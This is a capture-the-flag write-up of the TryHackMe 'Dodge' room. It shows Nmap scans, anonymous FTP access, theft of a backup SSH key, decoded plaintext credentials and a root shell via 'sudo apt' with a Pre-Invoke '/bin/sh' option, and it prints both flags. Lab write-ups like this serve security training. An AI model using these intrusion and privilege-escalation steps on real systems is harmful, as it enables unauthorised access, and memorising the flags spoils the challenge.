---
title: "TryHackMe - Dodge"
date: 2025-04-16 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [GTFOBins, firewall, ftp, ssh, pivoting, network evasion]
---


## Reconnaissance

The first step in any reconnaissance process is to run an **Nmap** scan to gather information about the target system.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -p- -T4 -sC -sV 10.10.100.237
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-15 05:51 EDT
Nmap scan report for 10.10.100.237
Host is up (0.072s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d0:a9:b7:9b:6d:f0:c2:09:e6:28:e0:77:8e:1a:d0:dc (RSA)
|   256 6c:b7:73:19:27:03:c6:3c:eb:d4:fe:90:04:54:1e:85 (ECDSA)
|_  256 9d:57:02:2d:b6:4a:8c:35:37:da:84:1a:99:1b:92:82 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.41
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
| ssl-cert: Subject: commonName=dodge.thm/organizationName=Dodge Company, Inc./stateOrProvinceName=Tokyo/countryName=JP
| Subject Alternative Name: DNS:dodge.thm, DNS:www.dodge.thm, DNS:blog.dodge.thm, DNS:dev.dodge.thm, DNS:touch-me-not.dodge.thm, DNS:netops-dev.dodge.thm, DNS:ball.dodge.thm
| Not valid before: 2023-06-29T11:46:51
|_Not valid after:  2123-06-05T11:46:51
|_http-title: 403 Forbidden
Service Info: Hosts: default, ip-10-10-100-237.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The conducted **nmap** scan revealed interesting information regarding the SSL certificate assigned to the domain `dodge.thm`. As a result of analyzing the Subject Alternative Name (SAN) field in the SSL certificate, several subdomains associated with the main domain were identified:

- www.dodge.thm

- blog.dodge.thm

- dev.dodge.thm

- touch-me-not.dodge.thm

- netops-dev.dodge.thm

- ball.dodge.thm

I am configuring the `/etc/hosts` file by adding the appropriate subdomains for proper domain name resolution

```bash
sudo nano /etc/hosts
```

I am searching the websites for interesting content.
![mainpage](/images/dodge/mainpage.jpg)
![dev.dodge](/images/dodge/dev.dodge.jpg)

The `netops-dev.dodge.thm` page does not contain any visible content, but while browsing the page's source, I found an interesting reference to the `firewall.js` script, which may suggest that this script is related to further steps in the system exploration.
![1-netops-dev](/images/dodge/1-netops-dev.jpg)

While analyzing the contents of the `firewall.js` script, I noticed a reference to another script `firewall10110.php`

![2-firewalljs](/images/dodge/2-firewalljs.jpg)

Navigating to the location of the `firewall10110.php` script, I gained access to the **„Update Firewall Rules”** section. I added the rule `sudo ufw allow 21`, allowing access to **port 21 (FTP)**. 

![3-firewall10110](/images/dodge/3-firewall10110.jpg)

```console
sudo ufw allow 21
```
I then performed a scan using **nmap** on port 21 for host `10.10.100.237`, obtaining the following results:

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -p21 -T4 -sC -sV 10.10.100.237
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-15 06:15 EDT
Nmap scan report for www.dodge.thm (10.10.100.237)
Host is up (0.065s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.21.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
Service Info: Host: Dodge

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.46 seconds
```

Port 21 is running the vsftpd FTP server, which allows anonymous login.



```
┌──(kali㉿kali)-[~/Desktop]
└─$ ftp 10.10.100.237 21
Connected to 10.10.100.237.
220 Welcome to Dodge FTP service
Name (10.10.100.237:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||12687|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-r--------    1 1003     1003           38 Jun 19  2023 user.txt
226 Directory send OK.
ftp> ls -la
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 .
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 ..
-rwxr-xr-x    1 1003     1003           87 Jun 29  2023 .bash_history
-rwxr-xr-x    1 1003     1003          220 Feb 25  2020 .bash_logout
-rwxr-xr-x    1 1003     1003         3771 Feb 25  2020 .bashrc
drwxr-xr-x    2 1003     1003         4096 Jun 19  2023 .cache
drwxr-xr-x    3 1003     1003         4096 Jun 19  2023 .local
-rwxr-xr-x    1 1003     1003          807 Feb 25  2020 .profile
drwxr-xr-x    2 1003     1003         4096 Jun 22  2023 .ssh
-r--------    1 1003     1003           38 Jun 19  2023 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
200 EPRT command successful. Consider using EPSV.
550 Failed to open file.
ftp> get .bash_history
local: .bash_history remote: .bash_history
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for .bash_history (87 bytes).
100% |******************************************************************************************************************|    87        1.97 MiB/s    00:00 ETA
226 Transfer complete.
87 bytes received in 00:00 (1.33 KiB/s)
ftp> 

```

After gaining access to the FTP server on port 21 through anonymous login, I started exploring the available files. After switching to passive mode, I successfully retrieved a directory listing, including the `user.txt` file, which was identified as potentially interesting.
<br>Initially, I was unable to download the `user.txt` file, but after further investigation and switching the mode to passive, I successfully downloaded the `.bash_history` file, which might contain valuable information related to previous user activities.
After downloading the `.bash_history` file, I opened it on my machine and reviewed its contents, which indicate the previous actions performed by the user. Here are the details:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat .bash_history                                  
history
exit
sudo -l
exit
exit
cat setup.php 
clear
exit
cat posts.php 
exit
exit
exit
```

Next, I navigated to the `.ssh` directory and began downloading the available files, which may contain information related to authorization and system access. In this directory, I found the `authorized_keys`, `id_rsa`, and `id_rsa_backup files`. I successfully downloaded the `authorized_keys` file and the backup private key `id_rsa_backup`, which could be a valuable step in further system exploration.

```console
ftp> cd .ssh
250 Directory successfully changed.
ftp> ls -la
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 1003     1003         4096 Jun 22  2023 .
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 ..
-rwxr-xr-x    1 1003     1003          573 Jun 22  2023 authorized_keys
-r--------    1 1003     1003         2610 Jun 22  2023 id_rsa
-rwxr-xr-x    1 1003     1003         2610 Jun 22  2023 id_rsa_backup
226 Directory send OK.
ftp> get authorized_keys
local: authorized_keys remote: authorized_keys
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for authorized_keys (573 bytes).
100% |******************************************************************************************************************|   573      297.48 KiB/s    00:00 ETA
226 Transfer complete.
573 bytes received in 00:00 (5.07 KiB/s)
ftp> get id_rsa
local: id_rsa remote: id_rsa
200 EPRT command successful. Consider using EPSV.
550 Failed to open file.
ftp> get id_rsa_backup
local: id_rsa_backup remote: id_rsa_backup
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for id_rsa_backup (2610 bytes).
100% |******************************************************************************************************************|  2610        3.15 MiB/s    00:00 ETA
226 Transfer complete.
2610 bytes received in 00:00 (38.81 KiB/s)
```

From the `authorized_keys` file, I read the user `challenger@thm-lamp`, who is associated with the public key. This suggests that the `challenger` user is configured to log in to the system

```
...HlPMGoLUcoH31phXUslNBjigdc8EPMOSX+7PhQVMD0= challenger@thm-lamp
```
## User access
I decided to use this key to establish a connection via **SSH**. During the connection attempt, a permissions error occurred:

```
Permissions 0664 for 'id_rsa_backup' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa_backup": bad permissions
challenger@10.10.100.237: Permission denied (publickey).
```

To fix this, I changed the permissions of the private key file:

```
chmod 600 id_rsa_backup
```

Now the key has the correct permissions, allowing me to proceed with further connection attempts

```console
┌──(kali㉿kali)-[~/Desktop/sshdodge]
└─$ ssh -i id_rsa_backup challenger@10.10.100.237
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.15.0-1039-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Apr 15 10:44:28 UTC 2025

  System load:                      0.0
  Usage of /:                       9.8% of 58.09GB
  Memory usage:                     10%
  Swap usage:                       0%
  Processes:                        125
  Users logged in:                  0
  IPv4 address for br-211982868f77: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.100.237

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

94 updates can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

1 updates could not be installed automatically. For more details,
see /var/log/unattended-upgrades/unattended-upgrades.log

Last login: Tue Apr 15 10:43:35 2025 from 10.8.21.77
challenger@thm-lamp:~$ 
```

After changing the permissions on the private key file, I was able to establish the **SSH** connection successfully. Now, I can read the first flag and proceed with further system escalation to gain higher privileges and continue exploring the environment.

```console
challenger@thm-lamp:~$ cat user.txt
THM{0649b2285e507b38b10620e57f9c8610}
challenger@thm-lamp:~$ 
```

## Root access

I decided to revisit the `.bash_history` file of the challenger user, where I noticed mentions of two scripts: `setup.php` and `posts.php`. I plan to take a closer look at these files to see if they contain any useful information or can aid in further system escalation.

```bash
challenger@thm-lamp:~$ find / -type f -name "setup.php" 2>/dev/null
/var/www/notes/api/setup.php
challenger@thm-lamp:~$ cd /var/www/notes/api
challenger@thm-lamp:/var/www/notes/api$ ls
add_post.php  delete_post.php  index.php  logout.php  setup.php
config.php    edit_post.php    login.php  posts.php
challenger@thm-lamp:/var/www/notes/api$ cat setup.php
cat: setup.php: Permission denied
challenger@thm-lamp:/var/www/notes/api$ cat posts.php
<?php
session_start();
require 'config.php';
header('Content-Type: application/json');
if (isset($_SESSION['username'])) {
    $posts = 'W3sidGl0bGUiOiJUby1kbyBsaXN0IiwiY29udGVudCI6IkRlZmluZSBhcHAgcmVxdWlyZW1lbnRzOjxicj4gMS4gRGVzaWduIHVzZXIgaW50ZXJmYWNlLiA8YnI+IDIuIFNldCB1cCBkZXZlbG9wbWVudCBlbnZpcm9ubWVudC4gPGJyPiAzLiBJbXBsZW1lbnQgYmFzaWMgZnVuY3Rpb25hbGl0eS4ifSx7InRpdGxlIjoiTXkgU1NIIGxvZ2luIiwiY29udGVudCI6ImNvYnJhIFwvIG16NCVvN0JHdW0jVFR1In1d';
    echo base64_decode($posts);

} else {
  echo json_encode(array('error' => 'Not logged in'));
}
?>
```

In the `setup.php` file, I noticed an encoded string, which I decided to decode using `CyberChef`. After decoding, I obtained some very interesting data

```
[{"title":"To-do list","content":"Define app requirements:<br> 1. Design user interface. <br> 2. Set up development environment. <br> 3. Implement basic functionality."},{"title":"My SSH login","content":"cobra \/ mz4%o7BGum#TTu"}]

```
After decoding the string in the `setup.php` file, I obtained the SSH login credentials for the `cobra` user:

`"My SSH login","content":"cobra \/ mz4%o7BGum#TTu"`

I decided to switch the user using the `su` command and log in with the obtained credentials.

```console
challenger@thm-lamp:/var/www/notes/api$ su cobra
Password: 
cobra@thm-lamp:/var/www/notes/api$ 
```
I gained access to the system as the `cobra` user. I am now verifying whether this user has permissions to execute the `sudo -l` command to check what operations they can perform with administrator privileges.

```console
cobra@thm-lamp:~$ sudo -l
Matching Defaults entries for cobra on thm-lamp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobra may run the following commands on thm-lamp:
    (ALL) NOPASSWD: /usr/bin/apt
```

This means that the `cobra` user has the ability to run the `apt` command as root without a password. Since apt can be used to execute commands as root,

I am searching the [`GTFOBins`](https://gtfobins.github.io/gtfobins/apt/#sudo) database to find a method for leveraging `apt` for privilege escalation

I use the following command:
```
cobra@thm-lamp:~$ sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```

to gain access to a shell with root privileges. Now, I can proceed to the next part of the task – locate and read the final flag.

**FLAG : THM{7b88ac4f52cd8723a8d0c632c2d930ba}**
